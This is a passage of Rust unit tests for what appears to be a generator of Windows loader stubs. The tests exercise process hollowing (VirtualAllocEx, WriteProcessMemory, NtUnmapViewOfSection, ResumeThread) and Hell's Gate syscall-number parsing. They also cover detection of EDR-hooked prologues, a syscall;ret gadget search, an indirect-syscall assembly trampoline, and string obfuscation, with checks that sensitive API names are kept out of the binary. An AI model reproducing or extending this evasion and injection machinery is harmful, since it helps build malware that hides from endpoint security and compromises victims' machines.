        // must still deduplicate (defensive).
        let pipeline = hollowing_pipeline();
        let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
        assert_eq!(names.len(), 5, "no duplicates expected");
    }

    // --- Hell's Gate parsing (unit-tested reference for the stub) ---

    #[test]
    fn resolve_ssn_extracts_the_expected_ssn_from_a_canonical_prologue() {
        // `mov r10, rcx; mov eax, 0x2A`
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8, 0x2A, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&prologue), Some(42));
    }

    #[test]
    fn resolve_ssn_reports_pattern_mismatch_for_a_hooked_prologue() {
        // A hooked stub (e.g. `jmp` to an EDR trampoline) has no SSN.
        let hooked = [0x48, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&hooked), None);
    }

    #[test]
    fn resolve_ssn_reports_function_not_found_when_the_buffer_is_unreadable() {
        // Mirrors the stub: a failed lookup (GetProcAddress/read) is
        // FunctionNotFound, before any pattern check happens.
        let lookup = |_name: &str| None;
        let read = |_addr: usize| None;
        let err = resolve_ssn_reference(&lookup, &read, "NtResumeThread")
            .expect_err("a missing function must fail");
        assert_eq!(
            err,
            ReferenceError::FunctionNotFound("NtResumeThread".into())
        );
    }

    #[test]
    fn resolve_ssn_reads_the_ssn_through_the_injected_lookup() {
        let lookup = |_name: &str| Some(0x1000);
        let read = |_addr: usize| Some([0x4C, 0x8B, 0xD1, 0xB8, 0x07, 0x00, 0x00, 0x00]);
        let ssn = resolve_ssn_reference(&lookup, &read, "NtWriteVirtualMemory")
            .expect("a canonical prologue should resolve");
        assert_eq!(ssn, 7);
    }

    /// Reference error type for [`resolve_ssn_reference`], mirroring the
    /// stub's `SyscallError::FunctionNotFound` / `PatternMismatch` variants.
    #[derive(Debug, PartialEq, Eq)]
    enum ReferenceError {
        FunctionNotFound(String),
        PatternMismatch(String),
    }

    /// Host-side mirror of the stub's `resolve_ssn`, with the address lookup
    /// and the memory read injected so the resolution logic is testable
    /// without Windows. Keep in sync with the generated stub's resolver.
    fn resolve_ssn_reference(
        lookup: &dyn Fn(&str) -> Option<usize>,
        read: &dyn Fn(usize) -> Option<[u8; 8]>,
        name: &str,
    ) -> std::result::Result<u32, ReferenceError> {
        let address =
            lookup(name).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        let prologue =
            read(address).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        parse_ssn_prologue(&prologue)
            .ok_or_else(|| ReferenceError::PatternMismatch(name.to_string()))
    }

    // --- gadget search (unit-tested reference for the stub) ---

    #[test]
    fn find_gadget_locates_the_syscall_ret_sequence() {
        let bytes = [0x90, 0x90, 0x0F, 0x05, 0xC3, 0xCC, 0xCC];
        assert_eq!(find_gadget_offset(&bytes), Some(2));
    }

    #[test]
    fn find_gadget_returns_none_when_the_sequence_is_absent() {
        let bytes = [0x0F, 0x05, 0xC2, 0x0F, 0x05, 0x90, 0xC3];
        assert_eq!(find_gadget_offset(&bytes), None);
    }

    #[test]
    fn find_gadget_returns_none_for_short_buffers() {
        assert_eq!(find_gadget_offset(&[]), None);
        assert_eq!(find_gadget_offset(&[0x0F, 0x05]), None);
    }

    // --- rendered block (tests 6 and 7 of the phase spec) ---

    #[test]
    fn indirect_block_obfuscates_the_nt_names() {
        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());

        // The names must be reconstructed at runtime, never cleartext outside
        // comments (doc comments never reach the binary; the guardrail strips
        // them the same way).
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext NT names leaked outside comments: {leaked:?}"
        );
        // ... while the obfuscated definitions and the resolver exist.
        assert!(
            block.contains("table.alloc_vm = resolve_ssn"),
            "missing resolution line"
        );
        assert!(block.contains("crate::dec_xor"), "xor strategy not applied");
        assert!(
            block.contains("resolve_ssn(module, &"),
            "no resolution lines"
        );
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn indirect_block_contains_the_trampoline_and_ssn_table() {
        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("jmp r11"), "gadget jump missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(block.contains("fn init_syscalls"), "init missing");
    }

    #[test]
    fn none_block_has_no_ssn_resolution() {
        let block = render_block(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
        );

        assert!(
            !block.contains("resolve_ssn"),
            "no SSN resolution in none mode"
        );
        assert!(!block.contains("global_asm"), "no trampoline in none mode");
        assert!(!block.contains("nt_invoke"), "no syscall in none mode");
        assert!(!block.contains("SsnTable"), "no SSN table in none mode");
        assert!(block.contains("VirtualAllocEx"), "direct call missing");
        assert!(block.contains("WriteProcessMemory"), "direct call missing");
        assert!(block.contains("ReadProcessMemory"), "direct call missing");
        assert!(block.contains("ResumeThread"), "direct call missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn none_block_obfuscates_the_dynamic_unmap_names() {
        let block = render_block(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
        );
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            !leaked
                .iter()
                .any(|l| l == "NtUnmapViewOfSection" || l == "ntdll.dll"),
            "dynamic-resolution names leaked outside comments: {leaked:?}"
        );
    }

    #[test]
    fn empty_pipeline_renders_a_no_op_block() {
        let block = render_block(&indirect(), &reflective_pipeline(), &xor_config());
        assert!(block.contains("fn init_syscalls"), "no-op init missing");
        assert!(
            !block.contains("global_asm"),
            "no machinery without requirements"
        );
        assert!(
            !block.contains("nt_alloc_vm"),
            "no helpers without requirements"
        );

        let none_block = render_block(&SyscallsConfig::default(), &[], &xor_config());
        assert!(none_block.contains("fn init_syscalls"));
        assert!(!none_block.contains("VirtualAllocEx"));
    }

    #[test]
    fn stack_strategy_obfuscates_names_without_dec_xor() {
        let stack = StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        };
        let block = render_block(&indirect(), &hollowing_pipeline(), &stack);
        assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext names leaked outside comments: {leaked:?}"
        );
        assert!(
            block.contains("std::hint::black_box"),
            "stack stores missing"
        );
    }
}
